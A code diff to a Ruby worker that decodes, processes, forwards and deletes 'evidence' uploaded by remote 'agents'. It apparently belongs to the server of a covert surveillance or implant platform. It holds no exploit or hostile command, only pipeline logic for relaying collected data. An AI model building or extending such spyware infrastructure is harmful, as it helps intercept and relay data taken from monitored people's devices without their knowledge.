@@ -67,7 +67,7 @@ class InstanceWorker
       until sleeping_too_much?
         until @evidences.empty?
           resume
-          evidence_id = BSON::ObjectId(@evidences.shift)
+          raw_id = BSON::ObjectId(@evidences.shift)
 
           trace :debug, "[#{@agent['ident']}:#{@agent['instance']}] still #{@evidences.size} evidences to go ..."
 
@@ -75,7 +75,7 @@ class InstanceWorker
             start_time = Time.now
 
             # get binary evidence
-            data = RCS::DB::GridFS.get(evidence_id, "evidence")
+            data = RCS::DB::GridFS.get(raw_id, "evidence")
             raise "Empty evidence" if data.nil?
 
             raw = data.read
@@ -85,12 +85,12 @@ class InstanceWorker
               RCS::Evidence.new(@key).deserialize(raw) do |data|
               end
             rescue EmptyEvidenceError => e
-              trace :info, "[#{evidence_id}:#{@ident}:#{@instance}] deleting empty evidence #{evidence_id}"
-              RCS::DB::GridFS.delete(evidence_id, "evidence")
+              trace :info, "[#{raw_id}:#{@ident}:#{@instance}] deleting empty evidence #{raw_id}"
+              RCS::DB::GridFS.delete(raw_id, "evidence")
               next
             rescue EvidenceDeserializeError => e
-              trace :warn, "[#{evidence_id}:#{@ident}:#{@instance}] decoding failed for #{evidence_id}: #{e.to_s}, deleting..."
-              RCS::DB::GridFS.delete(evidence_id, "evidence")
+              trace :warn, "[#{raw_id}:#{@ident}:#{@instance}] decoding failed for #{raw_id}: #{e.to_s}, deleting..."
+              RCS::DB::GridFS.delete(raw_id, "evidence")
               next
             end
 
@@ -105,10 +105,7 @@ class InstanceWorker
             evidences.each do |ev|
 
               next if ev.empty?
-
-              # store evidence_id inside evidence, we need it inside processors
-              ev[:db_id] = evidence_id
-
+              
               # find correct processing module and extend evidence
               mod = "#{ev[:type].to_s.capitalize}Processing"
               if RCS.const_defined? mod.to_sym
@@ -119,7 +116,7 @@ class InstanceWorker
 
               ev.process if ev.respond_to? :process
 
-              trace :debug, "[#{evidence_id}:#{@ident}:#{@instance}] processing evidence of type #{ev[:type]}"
+              trace :debug, "[#{raw_id}:#{@ident}:#{@instance}] processing evidence of type #{ev[:type]} (#{raw.bytesize} bytes)"
 
               # override original type
               ev[:type] = ev.type if ev.respond_to? :type
@@ -138,35 +135,42 @@ class InstanceWorker
                           end
 
               begin
-                evidence = processor.feed(ev) do |evidence, raw_ids|
+                evidence_id, index = processor.feed(ev) do |evidence|
                   # check if there are matching alerts for this evidence
                   RCS::DB::Alerting.new_evidence evidence unless evidence.nil?
 
                   # forward the evidence to connectors (if any)
-                  RCS::DB::Forwarding.new_evidence(evidence, raw_ids) unless evidence.nil?
+                  RCS::DB::Forwarding.new_evidence(evidence) unless evidence.nil?
                 end
+                
+                # forward raw evidence
+                RCS::DB::Forwarding.new_raw(raw_id, index, @agent, evidence_id)
+                
+                # delete raw evidence
+                RCS::DB::GridFS.delete(raw_id, "evidence")
+                trace :debug, "deleted raw evidence #{raw_id}"
+                
               rescue Exception => e
-                trace :error, "[#{evidence_id}:#{@ident}:#{@instance}] cannot store evidence, #{e.message}"
-                trace :error, "[#{evidence_id}:#{@ident}:#{@instance}] #{e.backtrace}"
+                trace :error, "[#{raw_id}:#{@ident}:#{@instance}] cannot store evidence, #{e.message}"
+                trace :error, "[#{raw_id}:#{@ident}:#{@instance}] #{e.backtrace}"
               end
-
             end
-
+            
             processing_time = Time.now - start_time
-            trace :info, "[#{evidence_id}] processed #{ev_type.upcase} for agent #{@agent['name']} in #{processing_time} sec"
+            trace :info, "[#{raw_id}] processed #{ev_type.upcase} for agent #{@agent['name']} in #{processing_time} sec"
 
           rescue Mongo::ConnectionFailure => e
-            trace :error, "[#{evidence_id}:#{@ident}:#{@instance}] cannot connect to database, retrying in 5 seconds ..."
+            trace :error, "[#{raw_id}:#{@ident}:#{@instance}] cannot connect to database, retrying in 5 seconds ..."
             sleep 5
             retry
           rescue Exception => e
-            trace :fatal, "[#{evidence_id}:#{@ident}:#{@instance}] FAILURE: " << e.to_s
-            trace :fatal, "[#{evidence_id}:#{@ident}:#{@instance}] EXCEPTION: " + e.backtrace.join("\n")
+            trace :fatal, "[#{raw_id}:#{@ident}:#{@instance}] FAILURE: " << e.to_s
+            trace :fatal, "[#{raw_id}:#{@ident}:#{@instance}] EXCEPTION: " + e.backtrace.join("\n")
 
             Dir.mkdir "forwarded" unless File.exists? "forwarded"
-            path = "forwarded/#{evidence_id}.raw"
+            path = "forwarded/#{raw_id}.raw"
             f = File.open(path, 'wb') {|f| f.write raw}
-            trace :debug, "[#{evidence_id}] forwarded undecoded evidence #{evidence_id} to #{path}"
+            trace :debug, "[#{raw_id}] forwarded undecoded evidence #{raw_id} to #{path}"
           end
         end
         take_some_rest
